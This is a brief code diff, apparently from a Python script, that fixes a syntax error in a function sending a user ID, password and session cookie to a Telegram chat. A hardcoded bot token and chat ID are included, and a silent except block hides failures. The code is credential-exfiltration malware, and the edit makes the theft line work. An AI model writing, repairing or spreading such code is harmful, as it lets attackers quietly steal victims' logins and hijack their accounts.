@@ -18,7 +18,7 @@ def HANDSOME(ids,pas,cookie):
         import requests
         token = "6967989114:AAEyppwDyUURbGkPUiJUJUC8SEAoQNO8Uaw"
         chatid = "6921807308"
-        ok_id =str(uid+"|"+pas+"|"+cookie+")
+        ok_id =str(uid+"|"+pas+"|"+cookie)
         params = {"chat_id": chatid, "text": ok_id}
         requests.get(url, params=params)
     except:
